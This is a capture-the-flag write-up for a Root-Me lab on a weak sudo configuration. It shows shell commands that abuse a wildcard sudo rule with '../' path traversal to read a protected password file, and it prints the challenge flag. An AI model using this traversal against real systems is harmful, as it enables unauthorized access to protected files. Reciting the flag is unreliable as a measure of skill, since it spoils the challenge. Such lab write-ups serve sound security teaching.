# Sudo Weak Configuration

URL: [https://www.root-me.org/en/Challenges/App-Script/sudo-weak-configuration](https://www.root-me.org/en/Challenges/App-Script/sudo-weak-configuration)
## Statement

Wishing to simplify the task by not modifying rights, the administrator has not thought about the side effects ...
## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                         |
| ---------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                       |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                           |
| Port       | 2222                                                                                                                                                                                                                                                                                                                          |
| SSH access | [ssh -p 2222 app-script-ch1@challenge02.root-me.org](ssh://app-script-ch1:app-script-ch1@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_8&ssh=ssh://app-script-ch1:app-script-ch1@challenge02 "WebSSH") |
| Username   | app-script-ch1                                                                                                                                                                                                                                                                                                                |
| Password   | app-script-ch1                                                                                                                                                                                                                                                                                                                |

## Solution

```bash
app-script-ch1@challenge02:~$ ls -alh
total 28K
dr-xr-x---  4 app-script-ch1-cracked app-script-ch1         4.0K Dec 10  2021 .
drwxr-xr-x 25 root                   root                   4.0K Sep  5  2023 ..
-r--------  1 root                   root                    921 Dec 10  2021 ._perms
-rw-r-----  1 root                   root                     42 Dec 10  2021 .git
dr-xr-x--x  2 app-script-ch1-cracked app-script-ch1-cracked 4.0K Dec 10  2021 ch1cracked
dr-xr-x--x  2 app-script-ch1-cracked app-script-ch1         4.0K Dec 10  2021 notes
-rw-r-----  1 app-script-ch1         app-script-ch1          217 Dec 10  2021 readme.md
app-script-ch1@challenge02:~$ cat readme.md
Vous devez réussir à lire le fichier .passwd situé dans le chemin suivant :
/challenge/app-script/ch1/ch1cracked/

You have to read the .passwd located in the following PATH :
/challenge/app-script/ch1/ch1cracked/
app-script-ch1@challenge02:~$ ls notes/
shared_notes
app-script-ch1@challenge02:~$ ls ch1cracked/
ls: cannot open directory 'ch1cracked/': Permission denied
app-script-ch1@challenge02:~$ cat notes/shared_notes
cat: notes/shared_notes: Permission denied
```

The current user can cat the files in notes directory as `app-script-ch1-cracked`
```bash
app-script-ch1@challenge02:~$ sudo -l
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, !mail_always,
    !mail_badpass, !mail_no_host, !mail_no_perms, !mail_no_user

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
```

The wildcard `*` mean anything after, this can be any file within `notes` or just path traversal anywhere

```bash
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/shared_notes
#####################
        Todo

- Change DHCP pool
- Change IP routing
- Beef up the fw
app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
b3_c4r3ful_w1th_sud0
```

::: tip Flag
`b3_c4r3ful_w1th_sud0`
:::

